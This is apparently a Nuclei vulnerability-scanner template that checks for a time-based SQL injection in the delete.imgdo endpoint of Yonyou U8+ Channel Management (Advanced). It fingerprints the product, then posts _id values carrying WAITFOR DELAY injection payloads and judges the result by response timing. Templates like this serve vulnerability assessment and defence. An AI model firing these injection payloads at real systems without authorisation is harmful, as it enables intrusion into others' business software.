id: poc-yaml-yongyon-u8-cm-ae-delete-imgdo-sqli
info:
  name: 用友U8+渠道管理(高级版) delete.imgdo SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 用友U8+
  description: |
    SQL Injection vulnerability in 用友U8+渠道管理(高级版) affecting delete.imgdo endpoint.

flow: |
  http(1) && http(2)

http:
  - path:
      - "{{BaseURL}}/indexbusiness.jsp"
    method: GET
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words:
          - "渠道管理（高级版）"

  - raw:
      - |
        POST /business/test/delete.imgdo HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        _id=';WAITFOR DELAY '0:0:5'--
      - |
        POST /business/test/delete.imgdo HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        _id=';WAITFOR DELAY '0:0:8'--
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words:
          - '{"message":0}'
      - type: word
        part: body
        negative: true
        words:
          - "<"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
